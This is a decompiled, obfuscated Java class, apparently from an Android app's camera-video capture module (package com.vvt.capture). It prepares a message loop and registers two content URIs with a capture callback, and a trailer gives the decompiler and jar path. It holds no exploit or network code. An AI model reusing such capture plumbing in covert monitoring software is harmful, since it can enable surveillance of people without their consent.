package com.vvt.capture.camera.video.b;

import android.net.Uri;
import android.os.Looper;
import com.vvt.base.capture.i;

class c
  implements Runnable
{
  c(b paramb, i parami) {}
  
  public void run()
  {
    Looper.prepare();
    b localb = this.b;
    Object localObject = Looper.myLooper();
    b.a(localb, (Looper)localObject);
    boolean bool = b.a();
    if (bool) {}
    localb = this.b;
    localObject = com.vvt.capture.camera.video.b.a;
    i locali = this.a;
    b.a(localb, (Uri)localObject, locali);
    localb = this.b;
    localObject = com.vvt.capture.camera.video.b.b;
    locali = this.a;
    b.a(localb, (Uri)localObject, locali);
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/video/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */